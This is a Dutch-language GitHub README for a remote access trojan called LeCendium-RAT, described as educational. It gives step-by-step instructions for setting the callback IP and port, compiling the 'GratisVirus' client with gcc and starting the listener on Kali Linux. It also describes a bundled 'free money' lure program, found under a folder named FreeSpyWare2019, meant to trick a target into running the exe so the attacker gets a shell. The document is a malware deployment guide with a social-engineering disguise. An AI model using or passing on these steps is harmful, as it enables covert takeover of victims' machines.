# LeCendium-RAT
- Deze RAT (Remote Administration Tool) is gemaakt voor educatieve doeleinden.

### Beschrijving
LeCendium zichzelf is gemaakt in C. Het bijgeleverde 'Gratis Geld' programma, is maar een eenvoudig voorbeeld hoe je deze RAT kan inzetten.
Het 'Gratis Geld' programma is gemaakt in C#. Ook hier zijn de code bestanden van beschikbaar.

### Vereisten voor gebruik
- Notepad++ of een IDE.
- MinGW
- Windows 7+ met administrator rechten.

### Editen naar persoonlijke voorkeuren
- Voor het editen naar persoonlijke voorkeuren, heb je de bovenstaande vereisten nodig.

- Open GratisVirus.c met jouw IDE (Sublime Text, Atom, etc)
- Verander de volgende 2 regels naar jouw ServerIP en Port voor connectie.
- Regel 143: ` ServIP = "192.168.198.130";`
- Regel 144: ` ServPort = 4444;`
- Stop de GratisVirus.c file in de bin directory van mingw32.

- Wanneer je klaar bent met het editen van deze gegevens, open je CMD (ALS ADMINISTRATOR)
- Change Directory naar de bin van MinGW. (` cd C:\Program Files (x86)\mingw-w64\i686-8.1.0-posix-dwarf-rt_v6-rev0\mingw32\bin`
- Voer in CMD het volgende in : ` gcc GratisVirus.c naamvanexebestand -lwininet -lwsock32` (Dit maakt een .exe bestand van de .c file)
De gebruiker of (target), zal dit .exe bestand moeten openen om een shellsessie te creëren.

### Gebruik maken van LeCendium
- Open jouw Linux distributie. (Kali Linux wordt in de video gebruikt).
- Open de Teriminal
- Clone de files van deze repository : `$ git clone https://github.com/1ncendium/LeCendium-RAT.git`
- Change directory naar LeCendium-RAT/ `cd LeCendium-RAT`
- Export de C file: `gcc LeCendium.c -o LeCendium`
- Run LeCendium `./LeCendium`

#### Note:
Wanneer je de exe file aanpast van GeldVirus.exe naar jouw eigen naam.exe, en het meegeleverde GratisGeld programma hierbij wilt gebruiken, moet je het GratisGeld programma wijzigen. Dit doe je met Visual Studio.

- Verander in het bestand 'GeldProgramma/FreeSpyWare2019/Form1.cs' regel 34 aan:
- ` string file = @"GeldVirus.exe";` Naar jouw bestandsnaam.exe.
